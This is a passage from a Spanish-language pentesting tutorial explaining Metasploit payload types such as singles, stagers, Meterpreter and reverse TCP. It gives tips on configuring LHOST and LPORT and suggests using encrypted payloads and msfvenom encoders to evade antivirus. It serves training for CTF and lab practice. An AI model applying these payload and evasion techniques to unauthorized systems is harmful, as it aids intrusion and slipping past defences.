**CTF / HackTheBox**:
- ✅ Meterpreter (conveniencia)
- ✅ Reverse TCP (funciona siempre)

**Red Team / Simulación de adversarios**:
- ✅ Payloads encriptados (HTTPS, RC4)
- ✅ Cobalt Strike / Empire

**Ejecución rápida de comando**:
- ✅ Shell simple
- ✅ Single payload

---

## 🔑 Conceptos Clave para Recordar

1. **Payload** = Código que se ejecuta DESPUÉS de la explotación exitosa
2. **Singles** = Todo-en-uno, más grandes pero más simples
3. **Stagers** = Pequeño cargador inicial que descarga el Stage
4. **Stages** = Payload completo descargado después del Stager
5. **Meterpreter** = Payload avanzado que vive en memoria, muy poderoso
6. **Reverse connections** = Más efectivas (bypass de firewall)
7. **`/` en nombre** = Indica staged payload
8. **grep** = Tu mejor amigo para buscar payloads

---

## 💡 Tips Prácticos

### Tip 1: Siempre Verificar LHOST

```bash
# Comando rápido desde msfconsole
msf6 > ifconfig
```

**Asegúrate de que sea la IP correcta** (tun0 para VPN, eth0 para LAN).

### Tip 2: Usar grep para Búsquedas

```bash
# Buscar Meterpreter + reverse + TCP
grep meterpreter grep reverse grep tcp show payloads
```

### Tip 3: Probar Diferentes Puertos

Si el puerto 4444 está bloqueado:

```bash
set LPORT 443   # Puerto HTTPS
set LPORT 80    # Puerto HTTP
set LPORT 8080  # Puerto alternativo
```

### Tip 4: Verificar Configuración Antes de Explotar

```bash
msf6 exploit(...) > show options
```

**Revisa que TODO esté configurado correctamente.**

---

## 🚨 Advertencias Importantes

### ⚠️ Configuración de Red

**Problema común**: Exploit funciona pero no hay sesión creada

**Causa**: NAT vs Adaptador Puente en VM

**Solución**:
- ✅ Usar **Adaptador Puente** para pentesting
- ✅ Verificar que LHOST sea accesible desde el objetivo

### ⚠️ Antivirus y Firewalls

**Meterpreter** es detectado por muchos antivirus modernos.

**Soluciones**:
- Usar payloads encriptados (RC4)
- Usar HTTPS en lugar de TCP
- Generar payload personalizado con msfvenom + encoders

---

## 🎯 Próximos Pasos

> A continuación, veremos **Encoders** y cómo pueden ser usados para influenciar el resultado del ataque.

**Temas siguientes**:
- Encoders (evasión de AV)
- msfvenom (generación de payloads)
- Post-explotación avanzada
- Persistencia

---

## 📖 Recursos Adicionales

### Documentación Oficial
- https://docs.metasploit.com/docs/using-metasploit/basics/how-payloads-work.html
- https://www.offensive-security.com/metasploit-unleashed/payloads/

### Investigación Adicional
- Empire Framework: https://github.com/BC-SECURITY/Empire
- Cobalt Strike: https://www.cobaltstrike.com/

---

**¡Ahora tienes un entendimiento completo de los Payloads en Metasploit!** 🚀

En la próxima sección, aprenderemos cómo **ofuscar y encodear** estos payloads para evadir detección.
